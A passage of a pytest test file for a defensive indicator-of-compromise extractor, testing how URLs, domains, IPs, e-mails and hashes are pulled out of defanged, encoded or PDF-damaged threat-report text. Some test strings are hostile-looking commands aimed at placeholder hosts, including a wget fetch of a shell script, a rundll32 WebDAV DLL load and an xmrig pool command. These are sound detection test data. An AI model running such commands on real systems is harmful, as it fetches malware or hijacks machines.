        assert not is_reserved_ip("2606:4700:4700::1111")
        assert not is_reserved_ip("64:ff9b::808:808")


def test_embedded_ipv4_addresses_are_written_dotted_and_read_back() -> None:
    assert everything("::1.2.3.4") == [("ipv4", "1.2.3.4"), ("ipv6", "::1.2.3.4")]
    assert everything("64:ff9b::c633:6401") == [("ipv6", "64:ff9b::198.51.100.1")]
    assert everything("::ffff") == []


@pytest.mark.parametrize(
    ("text", "url", "address"),
    [
        ("http://3221225985/payload.exe", "http://3221225985/payload.exe", "192.0.2.1"),
        ("http://0xC0000201/x", "http://0xc0000201/x", "192.0.2.1"),
        ("http://0300.0000.0002.0001/x", "http://0300.0000.0002.0001/x", "192.0.2.1"),
        ("hxxp://0xc0.0.2.1:8080/x", "http://0xc0.0.2.1:8080/x", "192.0.2.1"),
        ("http://010.0.0.1/x", "http://010.0.0.1/x", "8.0.0.1"),
    ],
)
def test_integer_hex_and_octal_url_hosts(text: str, url: str, address: str) -> None:
    assert everything(text) == [("url", url), ("ipv4", address)]
    # Filtered like the address: 192.0.2.1 is a documentation address.
    assert analyze_text(text).iocs == [] or address == "8.0.0.1"


@pytest.mark.parametrize("host", ["99999999999", "0x123456789", "1.2.3", "0day.example.com", "256.1.1.1"])
def test_hosts_that_are_not_legacy_addresses(host: str) -> None:
    assert all(t != "ipv4" for t, _ in everything(f"http://{host}/x"))


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("\u26a0\ufe0fsecure-login[.]example[.]com", [("domain", "secure-login.example.com")]),
        ("\u27a1\ufe0fc2.example.net", [("domain", "c2.example.net")]),
        ("1\ufe0f\u20e3evil-a.example.com", [("domain", "evil-a.example.com")]),
        ("\u2709\ufe0fphish-ops[@]example[.]org", [("email", "phish-ops@example.org")]),
        # Right-to-left letters cannot share a label with Latin ones.
        ("\u0648evil-b.example.com", [("domain", "evil-b.example.com")]),
        ("\u05d4\u05e9\u05e8\u05ea\u200eevil.example.com\u200f\u05d5", [("domain", "evil.example.com")]),
        # Marks on letters and letters of other scripts still join the name.
        ("bu\u0308cher.de micros\u043eft.com", []),
    ],
)
def test_emoji_and_right_to_left_letters_next_to_names(text: str, expected: list[tuple[str, str]]) -> None:
    assert everything(text) == expected


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("\\\\files.example.net@SSL\\DavWWWRoot\\x", ["files.example.net"]),
        ("rundll32 \\\\files.example.net@SSL@443\\DavWWWRoot\\x.dll,Entry", ["files.example.net"]),
        ("\\\\files.example.net@80\\share", ["files.example.net"]),
        ("search-ms:crumb=location:\\\\files.example.net@SSL\\DavWWWRoot", ["files.example.net"]),
        ("\u5171\u4eab\u8def\u5f91\uff1a\\\\fs.example.net\\share", ["fs.example.net"]),
        ("C2:\\\\fs.example.net\\share", ["fs.example.net"]),
        ('{"p": "\\\\\\\\fs.example.net\\\\share"}', ["fs.example.net"]),
        ("\u4f86\u6e90\uff1a//cdn.example.org/x.js", ["cdn.example.org"]),
        # Not hosts: drive paths, unknown schemes, e-mail addresses.
        ("C:\\\\evil.com\\x C:\\evil.com unknown://evil.com", []),
        ("john.name@example.com", []),
    ],
)
def test_unc_webdav_and_label_colon_hosts(text: str, expected: list[str]) -> None:
    assert values(text, IOCType.DOMAIN) == expected


def test_redirect_targets_leave_the_wrapper_parameters() -> None:
    text = "https://safelinks.example.com/?url=https%3A%2F%2Fphish.example.org%2Flogin&data=05%7C01&sdata=abc"
    assert ("url", "https://phish.example.org/login") in everything(text)
    encoded = "https://redir.example.net/r?u=https%3A%2F%2Fphish.example.org%2Flogin%3Fa%3D1%26b%3D2&m=x"
    assert ("url", "https://phish.example.org/login?a=1&b=2") in everything(encoded)


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        (
            "IOCs: http://198.51.100.5,ops@example.org",
            [("url", "http://198.51.100.5"), ("ipv4", "198.51.100.5"), ("email", "ops@example.org")],
        ),
        (
            "GET /gate.php?url=http://a.example.com&email=victim@example.org",
            [("url", "http://a.example.com"), ("domain", "a.example.com"), ("email", "victim@example.org")],
        ),
        # "=" stays allowed in userinfo: base64 passwords.
        (
            "ftp://user:cGFzcw==@files.example.net/",
            [("url", "ftp://user:cGFzcw==@files.example.net/"), ("domain", "files.example.net")],
        ),
        # The userinfo of a URL inside a URL is not an e-mail address either.
        (
            "https://web.archive.org/web/2020/ftp://anonymous:guest@ftp.example.net/pub/",
            [
                ("url", "ftp://anonymous:guest@ftp.example.net/pub/"),
                ("url", "https://web.archive.org/web/2020/ftp://anonymous:guest@ftp.example.net/pub/"),
                ("domain", "ftp.example.net"),
                ("domain", "web.archive.org"),
            ],
        ),
    ],
)
def test_userinfo_and_url_lists(text: str, expected: list[tuple[str, str]]) -> None:
    assert everything(text) == expected


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("to=%3Cops@example.org%3E", ["ops@example.org"]),
        ("mailto:%22John%20Doe%22%20%3Cjd@example.org%3E", ["jd@example.org"]),
        ("Bcc:%0Aops@example.org", ["ops@example.org"]),
        ("q=%2522ops@example.org", ["ops@example.org"]),
        # "%" itself is allowed in a local part.
        ("user%name@example.org", ["user%name@example.org"]),
    ],
)
def test_encoded_delimiters_before_email_addresses(text: str, expected: list[str]) -> None:
    assert values(text, IOCType.EMAIL) == expected


@pytest.mark.parametrize(
    "text",
    [
        "$d = (Get-WmiObject Win32_ComputerSystem).Domain.Name",
        "Path(__file__).parent.name",
        "a[i].link.click()",
        "x = {a:1}.data.top",
    ],
)
def test_member_access_after_calls_is_not_a_domain(text: str) -> None:
    assert pairs(text) == []


@pytest.mark.parametrize(
    "text",
    [
        "using System.Net.Security;",
        "using System.Security.Claims;",
        "using Microsoft.Data;",
        "Microsoft.Office.Tools",
        "Windows.Media",
        "System.Web.Hosting",
    ],
)
def test_dotnet_namespaces_are_code(text: str) -> None:
    assert pairs(text) == []
    assert stats_for(text) == Counter({"code_identifier": 1})


def test_lower_case_names_under_namespace_roots_are_domains() -> None:
    assert values("windows.media microsoft.data", IOCType.DOMAIN) == ["microsoft.data", "windows.media"]


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("\u56de\u9023hxxp://evil[.]example/gate.php\uff08C2\uff09", "http://evil.example/gate.php"),
        ("hxxps://evil[.]example/x.exe\uff0cMD5\uff1a5f89", "https://evil.example/x.exe"),
        ("C2\uff1ahxxp://evil[.]example/api\uff1bbackup", "http://evil.example/api"),
        ("http://evil.example/a.exe\uff08Stage 1\uff09", "http://evil.example/a.exe"),
        ("\u7db2\u5740 hxxps://evil[.]example/x.exe\uff01C2", "https://evil.example/x.exe"),
    ],
)
def test_full_width_punctuation_ends_urls(text: str, expected: str) -> None:
    assert values(text, IOCType.URL) == [expected]


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("_http://evil.com_.", [("url", "http://evil.com"), ("domain", "evil.com")]),
        ("__http://evil.com__.", [("url", "http://evil.com"), ("domain", "evil.com")]),
        ("see _http://198.51.100.7_.", [("url", "http://198.51.100.7"), ("ipv4", "198.51.100.7")]),
        ("http://evil.com.", [("url", "http://evil.com"), ("domain", "evil.com")]),
    ],
)
def test_underscore_markup_after_url_hosts(text: str, expected: list[tuple[str, str]]) -> None:
    assert everything(text) == expected


@pytest.mark.parametrize(
    ("text", "url", "host"),
    [
        (
            "xmrig -o stratum+tcp://pool.example.net:3333",
            "stratum+tcp://pool.example.net:3333",
            "pool.example.net",
        ),
        ("stratum+ssl://pool.example.net:443", "stratum+ssl://pool.example.net:443", "pool.example.net"),
        ("git+ssh://git@example.org/x.git", "git+ssh://git@example.org/x.git", "example.org"),
        (
            "smtp://exfil:Winter2024@mail.example.net:587",
            "smtp://exfil:Winter2024@mail.example.net:587",
            "mail.example.net",
        ),
        ("socks5://proxy.example.org:1080", "socks5://proxy.example.org:1080", "proxy.example.org"),
        ("mongodb+srv://u:p@db.example.net/x", "mongodb+srv://u:p@db.example.net/x", "db.example.net"),
        ("redis://u:p@cache.example.net:6379", "redis://u:p@cache.example.net:6379", "cache.example.net"),
    ],
)
def test_compound_and_credentialed_schemes(text: str, url: str, host: str) -> None:
    assert everything(text) == [("url", url), ("domain", host)]


def test_unknown_compound_schemes_keep_their_prefix() -> None:
    assert values("x+tcp://example.com git+https://git.example.net/a.git", IOCType.URL) == [
        "git+https://git.example.net/a.git",
        "x+tcp://example.com",
    ]
    # Not after a word and a dot: "foo.tcp" is a name, not a scheme.
    assert values("foo.tcp://example.com", IOCType.URL) == []


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("https://evil.example.com/q&apos;", ["https://evil.example.com/q"]),
        ("<p>https://evil.example.com/a.bin&nbsp;</p>", ["https://evil.example.com/a.bin"]),
        ("https://evil.example.com/a&GT;", ["https://evil.example.com/a"]),
        ("__https://evil.example.com/payload.bin__", ["https://evil.example.com/payload.bin"]),
        (
            "**http://a.example.com/x**,**http://b.example.com/y**",
            ["http://a.example.com/x", "http://b.example.com/y"],
        ),
        # Underscores in paths stay.
        ("https://evil.example.com/a__init__", ["https://evil.example.com/a__init__"]),
    ],
)
def test_more_url_tail_markup(text: str, expected: list[str]) -> None:
    assert values(text, IOCType.URL) == expected


@pytest.mark.parametrize(
    "name", ["payload.dll.zip", "setup.msi.zip", "update.ps1.zip", "run.bat.zip", "disk.vhd.zip"]
)
def test_payload_double_extensions_are_file_names(name: str) -> None:
    assert pairs(name) == []
    assert stats_for(name) == Counter({"filename_like_domain": 1})
    assert values(f"https://{name}/a", IOCType.DOMAIN) == [name]


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("IP:2001:db8::1", ["2001:db8::1"]),
        ("IPv6:2001:db8::2", ["2001:db8::2"]),
        ("host=srv;ip:2001:db8::3", ["2001:db8::3"]),
        # Times and MAC addresses after a label stay out.
        ("Time:12:30:45 Mac:00:11:22:33:44:55", []),
    ],
)
def test_ipv6_after_letter_labels(text: str, expected: list[str]) -> None:
    assert values(text, IOCType.IPV6) == expected


def test_typographic_dash_in_punycode_names() -> None:
    assert values("C2: xn\u201380ak6aa92e.example and xn\u201480ak6aa92e.example", IOCType.DOMAIN) == [
        "xn--80ak6aa92e.example"
    ]
    # An em dash in prose is not part of a name.
    assert values("C2 server\u2014evil.example.com", IOCType.DOMAIN) == ["evil.example.com"]


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        (
            "\u2066evil.example.com\u2069\u2066example.net\u2069",
            [("domain", "evil.example.com"), ("domain", "example.net")],
        ),
        (
            "\u2068198.51.100.7\u2069\u2068203.0.113.9\u2069",
            [("ipv4", "198.51.100.7"), ("ipv4", "203.0.113.9")],
        ),
        (
            "contact admin@example.com\u2069\u2066evil.example.net",
            [("domain", "evil.example.net"), ("email", "admin@example.com")],
        ),
        ("evil\u2063example.org", [("domain", "example.org")]),
        # Inside a name a mark is still removed.
        ("ev\u200eil-cdn.net", [("domain", "evil-cdn.net")]),
    ],
)
def test_bidi_controls_between_names_separate_them(text: str, expected: list[tuple[str, str]]) -> None:
    assert everything(text) == expected


# --------------------------------------------------------------------------- review of the fixes


@pytest.mark.parametrize(
    ("text", "url", "host"),
    [
        ("1.hxxp://evil[.]example[.]com/a.exe", "http://evil.example.com/a.exe", "evil.example.com"),
        (
            "1\uff0ehxxp://evil\u3010.\u3011example\u3010.\u3011com/a.exe",
            "http://evil.example.com/a.exe",
            "evil.example.com",
        ),
        ("e.g.https://example.org/login", "https://example.org/login", "example.org"),
        ("...http://cdn.example.com/x.bin", "http://cdn.example.com/x.bin", "cdn.example.com"),
        ("URL-http://example.org/x", "http://example.org/x", "example.org"),
        (
            "pip install git+https://git.example.net/a/b.git",
            "git+https://git.example.net/a/b.git",
            "git.example.net",
        ),
        (
            "daemon+https://node.example.org:18081",
            "daemon+https://node.example.org:18081",
            "node.example.org",
        ),
        (
            "ftp://backup:Pa;ss@files.example.com/up/",
            "ftp://backup:Pa;ss@files.example.com/up/",
            "files.example.com",
        ),
        (
            "smtp://bot:a&b,c@mail.example.com:587",
            "smtp://bot:a&b,c@mail.example.com:587",
            "mail.example.com",
        ),
    ],
)
def test_url_starts_and_userinfo_after_the_review(text: str, url: str, host: str) -> None:
    assert everything(text) == [("url", url), ("domain", host)]


def test_query_values_decode_plus_as_space() -> None:
    text = "https://search.example.com/?q=see+https://evil.example.org/x"
    assert ("url", "https://evil.example.org/x") in everything(text)


def test_url_in_a_path_keeps_its_query() -> None:
    text = "https://web.archive.org/web/2020/http://evil.example.com/gate.php?id=1&cmd=2"
    assert ("url", "http://evil.example.com/gate.php?id=1&cmd=2") in everything(text)


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("q=%E8%AE%BF%E9%97%AEevil.example.com", [("domain", "evil.example.com")]),
        ("GET /s?q=%E8%AE%BF%E9%97%AE198.51.100.7 HTTP/1.1", [("ipv4", "198.51.100.7")]),
        ("LIKE '%cafe-cdn.example.com'", [("domain", "cafe-cdn.example.com")]),
        (
            "%2Eevil.example.com %2Devil2.example.com",
            [("domain", "evil.example.com"), ("domain", "evil2.example.com")],
        ),
        ("%25198.51.100.7", [("ipv4", "198.51.100.7")]),
    ],
)
def test_percent_escapes_after_the_review(text: str, expected: list[tuple[str, str]]) -> None:
    assert everything(text) == expected


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("ops\u200f@example.org", [("email", "ops@example.org")]),
        ("Reply-To: ops@\u200eexample.org", [("email", "ops@example.org")]),
        ("malicious\u200e[.]example[.]com", [("domain", "malicious.example.com")]),
        (
            "hxxps://cdn.example.com/\u200epayload/stage2.bin",
            [("url", "https://cdn.example.com/payload/stage2.bin"), ("domain", "cdn.example.com")],
        ),
        (
            "wget http://\u200e198.51.100.7/bins.sh",
            [("url", "http://198.51.100.7/bins.sh"), ("ipv4", "198.51.100.7")],
        ),
        ("C2 2001:\u200edb8:85a3::8a2e:370:7334", [("ipv6", "2001:db8:85a3::8a2e:370:7334")]),
        ("ev\u00ad\u200eil.example.com", [("domain", "evil.example.com")]),
    ],
)
def test_bidi_marks_inside_iocs_are_removed(text: str, expected: list[tuple[str, str]]) -> None:
    assert everything(text) == expected


def test_right_to_left_homographs_inside_names() -> None:
    assert everything("secure-l\u05e1gin.example.com microsof\u0647t.com") == []
    assert everything("\u05d1evil.example.com") == [("domain", "evil.example.com")]


def test_code_identifier_prefixes_need_code_style() -> None:
    assert values("microsoft.office.secure-login.example.com asp.net.example.org", IOCType.DOMAIN) == [
        "asp.net.example.org",
        "microsoft.office.secure-login.example.com",
    ]
    assert pairs("System.Net.Security ASP.NET.Core") == []


@pytest.mark.parametrize("label", ["src", "Source", "Device", "remote", "Interface", "Node", "outside", "ID"])
def test_ipv6_after_labels_ending_in_hex_letters(label: str) -> None:
    assert values(f"{label}:2001:db8::5/443", IOCType.IPV6) == ["2001:db8::5"]


@pytest.mark.parametrize(
    "text", ["q=%E2%80%9Cops@example.org%E2%80%9D", "q=%C2%A0ops@example.org", "q=%25C2%25A0ops@example.org"]
)
def test_encoded_non_ascii_before_email_addresses(text: str) -> None:
    assert values(text, IOCType.EMAIL) == ["ops@example.org"]


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("%25cafe.example.com", [("domain", "cafe.example.com")]),
        ("%2Fcafe.example.com%", [("domain", "cafe.example.com")]),
        (
            "%7Ecafe.example.com %2Acafe2.example.com",
            [("domain", "cafe.example.com"), ("domain", "cafe2.example.com")],
        ),
        ("%25E8%25AE%25BFevil.example.com", [("domain", "evil.example.com")]),
        ('"ua": "Mozilla/5.0 Chrome\\/120.0.0.0"', []),
    ],
)
def test_percent_escapes_and_versions_after_the_recheck(text: str, expected: list[tuple[str, str]]) -> None:
    assert everything(text) == expected


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        (
            "URL=file://files.example.net@SSL/DavWWWRoot/a.exe",
            [("url", "file://files.example.net@ssl/DavWWWRoot/a.exe"), ("domain", "files.example.net")],
        ),
        (
            "URL=file://files.example.net@80/share/a.lnk",
            [("url", "file://files.example.net@80/share/a.lnk"), ("domain", "files.example.net")],
        ),
        (
            "URL=file://198.51.100.20@SSL/x",
            [("url", "file://198.51.100.20@ssl/x"), ("ipv4", "198.51.100.20")],
        ),
    ],
)
def test_webdav_file_urls(text: str, expected: list[tuple[str, str]]) -> None:
    assert everything(text) == expected


@pytest.mark.parametrize(
    "text",
    ["socks://u:p@proxy.example.org:1080", "rsync://u:p@backup.example.org/m", "vnc://u:p@desk.example.org"],
)
def test_more_credentialed_schemes(text: str) -> None:
    assert [t for t, _ in everything(text)] == ["url", "domain"]


@pytest.mark.parametrize(
    "name", ["Invoice.one.zip", "setup.sh.zip", "tool.py.zip", "addin.xll.zip", "app.apk.zip"]
)
def test_more_double_extensions(name: str) -> None:
    assert pairs(name) == []


# --------------------------------------------------------------------------- PDF text and labelled values
# Found by the evaluation on real reports (docs/research/2026-10-real-reports.md).


def test_guid_written_with_soft_hyphens_is_not_an_md5() -> None:
    assert pairs("{0F1E2D3C\u00ad4B5A\u00ad6978\u00ad8796\u00adA5B4C3D2E1F0}.dll") == []
    assert values("MD5 d41d8cd98f00\u00adb204e9800998ecf8427e", IOCType.MD5) == [
        "d41d8cd98f00b204e9800998ecf8427e"
    ]


@pytest.mark.parametrize(
    "text",
    [
        'SerialNumber:"00B68E6DB2BB7412FABCBAA2192394AD"',
        "Serial Number: 00b68e6db2bb7412fabcbaa2192394ad",
        "serial_no=00b68e6db2bb7412fabcbaa2192394ad",
        "序列号：00B68E6DB2BB7412FABCBAA2192394AD",
        "證書序號：00b68e6db2bb7412fabcbaa2192394ad5f3e2d1c",
        "序號: 00b68e6db2bb7412fabcbaa2192394ad",
    ],
)
def test_certificate_serial_numbers_are_not_hashes(text: str) -> None:
    assert pairs(refang(text)) == []
    assert stats_for(refang(text))["certificate_serial"] == 1


@pytest.mark.parametrize(
    "text",
    [
        "序號 d41d8cd98f00b204e9800998ecf8427e",  # the row-number column of a table
        "序號\td41d8cd98f00b204e9800998ecf8427e",
        "序號 1 d41d8cd98f00b204e9800998ecf8427e",
    ],
)
def test_row_number_heading_is_not_a_serial_label(text: str) -> None:
    assert values(text, IOCType.MD5) == ["d41d8cd98f00b204e9800998ecf8427e"]


def test_values_after_other_labels_are_still_hashes() -> None:
    text = (
        "Thumbprint: 1C3CBEAADDC4AAA8F3B743F4D7E8537F4C1EA597\n"
        "SerialNumber: 7, MD5 d41d8cd98f00b204e9800998ecf8427e"
    )
    assert values(text, IOCType.SHA1) == ["1c3cbeaaddc4aaa8f3b743f4d7e8537f4c1ea597"]
    assert values(text, IOCType.MD5) == ["d41d8cd98f00b204e9800998ecf8427e"]


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("c2.example.-\ncom", ["c2.example.com"]),
        ("files.example-\n.net", ["files.example.net"]),
        ("c2.example.- \r\n  org 198.51.100.7", ["c2.example.org"]),
        ("download\n.example.-\ncom", ["example.com"]),  # a line break without a hyphen is not joined
    ],
)
def test_names_split_next_to_a_dot_are_joined(text: str, expected: list[str]) -> None:
    assert values(text, IOCType.DOMAIN) == expected


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("http://198.51.100.7/1/update-\nwin.exe", "http://198.51.100.7/1/update-win.exe"),
        (
            "下载：https://www.example.com/a/first-\nsecond.pdf 其他",
            "https://www.example.com/a/first-second.pdf",
        ),
        ("hxxp://files.example[.]org/covid-  \n19/a.exe", "http://files.example.org/covid-19/a.exe"),
    ],
)
def test_url_broken_after_its_own_hyphen_is_joined(text: str, expected: str) -> None:
    assert values(text, IOCType.URL) == [expected]


@pytest.mark.parametrize(
    "text",
    [
        "files.dynamic-\nexample.net",  # "dynamic-example.net" or "dynamicexample.net"
        "androidup\u2010\nexample.com",  # a typographic hyphen, folded to "-"
        "ops-\nteam@example.org",
        "update-\n  example.com",
    ],
)
def test_name_after_a_hyphen_at_a_line_end_is_a_fragment(text: str) -> None:
    assert pairs(refang(text)) == []
    assert stats_for(refang(text))["line_wrap_fragment"] == 1


@pytest.mark.parametrize(
    "text", ["C2 -\nexample.com", "C2:\nexample.com", "end.\nexample.com", "a--\nexample.com"]
)
def test_names_after_other_line_ends_are_kept(text: str) -> None:
    assert values(text, IOCType.DOMAIN) == ["example.com"]


@pytest.mark.parametrize(
    "text",
    [
        "wiki.xxxx.com",
        "mail.xxx.example.net",
        "XXXXXX.com",
        "ops@xxxx.example.org",
        "http://xxxx.example.com/a",
    ],
)
def test_masked_names_are_dropped(text: str) -> None:
    assert pairs(text) == []
    assert stats_for(text)["masked_name"] == 1


def test_names_with_x_runs_that_are_not_masks_are_kept() -> None:
    assert values("example.xxx taxxx.example.com xx.example.com", IOCType.DOMAIN) == [
        "example.xxx",
        "taxxx.example.com",
        "xx.example.com",
    ]


@pytest.mark.parametrize(
    "name", ["Backdoor.Win32.Ht", "Trojan.MSIL.Bot", "virus.win32.sality.ms", "Worm.Linux.Ms"]
)
def test_detection_names_are_not_domains(name: str) -> None:
    assert pairs(name) == []
    assert stats_for(name)["detection_name"] == 1


def test_names_like_detection_names_are_kept() -> None:
    assert values("trojan.example.ht win32.example.com backdoor.example.com", IOCType.DOMAIN) == [
        "backdoor.example.com",
        "trojan.example.ht",
        "win32.example.com",
    ]


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        # A soft hyphen at a line end is read as a hyphen there, so the line-break rules apply.
        ("update\u00ad\ncheck-server.example.com", []),
        ("update\u00ad \u200b\r\n  check-server.example.com", []),
        ("c2.example.\u00ad\ncom", [("domain", "c2.example.com")]),
        ("files.example\u00ad\n.net", [("domain", "files.example.net")]),
        (
            "http://198.51.100.7/1/update\u00ad\nwin.exe",
            [("url", "http://198.51.100.7/1/update-win.exe"), ("ipv4", "198.51.100.7")],
        ),
    ],
)
def test_soft_hyphen_at_a_line_end_is_a_hyphen(text: str, expected: list[tuple[str, str]]) -> None:
    assert everything(text) == expected


def test_soft_hyphen_at_a_line_end_leaves_a_fragment() -> None:
    assert stats_for(refang("update\u00ad\ncheck-server.example.com"))["line_wrap_fragment"] == 1


def soft_hyphen_warnings(text: str) -> list[str]:
    result = analyze_text(text, AnalysisOptions(include_reserved=True))
    return [w for w in result.warnings if "U+00AD" in w]


@pytest.mark.parametrize(
    "text",
    [
        "C2: KB\u00adAuto.example.com",
        "http://198.51.100.7/1/KB\u00adAuto\u00adwin\u00adupdate.exe",
        "mail ops\u00adteam@example.org now",
        "c2.up\u00addate.example.net",
    ],
)
def test_soft_hyphens_inside_names_and_urls_are_reported(text: str) -> None:
    assert len(soft_hyphen_warnings(text)) == 1


@pytest.mark.parametrize(
    "text",
    [
        "Hyphen\u00adation in prose, and c2.example.com",
        "please up\u00addate now: http://198.51.100.7/update.exe",  # the word touches no name punctuation
        "MD5 d41d8cd98f00\u00adb204e9800998ecf8427e",  # hashes have no hyphens to lose
        "{0F1E2D3C\u00ad4B5A\u00ad6978\u00ad8796\u00adA5B4C3D2E1F0}",
        "update\u00ad\ncheck-server.example.com",
        "\u00adexample.com and example.org\u00ad",
    ],
)
def test_other_soft_hyphens_are_not_reported(text: str) -> None:
    assert soft_hyphen_warnings(text) == []


def test_soft_hyphen_warning_counts_the_values() -> None:
    (warning,) = soft_hyphen_warnings("a\u00adb.example.com c\u00add.example.net e.example.org")
    assert warning.startswith("2 name(s)")
